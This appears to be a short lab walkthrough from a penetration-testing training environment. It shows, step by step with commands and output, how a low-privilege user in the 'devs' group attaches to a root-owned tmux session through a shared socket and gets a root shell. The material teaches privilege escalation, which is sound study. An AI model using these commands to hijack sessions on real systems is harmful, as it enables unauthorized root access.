# Tmux

## Checking Running Processes

```sh
htb-student@NIX02:~$ ps aux | grep tmux | grep -v grep
```

```output title="Output"
root       18601  0.0  0.2  13584  9124 ?        Ss   13:23   0:00 tmux -S /shared new -s session
```

## Checking Permissions

```sh
htb-student@NIX02:~$ ls -l /shared
```

```output title="Output"
srw-rw---- 1 root devs 0 May 18 13:23 /shared
```

## Checking Group Membership

```sh
htb-student@NIX02:~$ id
```

```output title="Output"
uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),1002(devs)
```

## Checking Server Access

```sh
htb-student@NIX02:~$ tmux -S /shared server-access -l
```

```output title="Output"
htb-student (W)
```

## Session Hijacking

```sh
htb-student@NIX02:~$ tmux -S /shared
root@NIX02:~# id
```

```output title="Output"
uid=0(root) gid=0(root) groups=0(root)
```
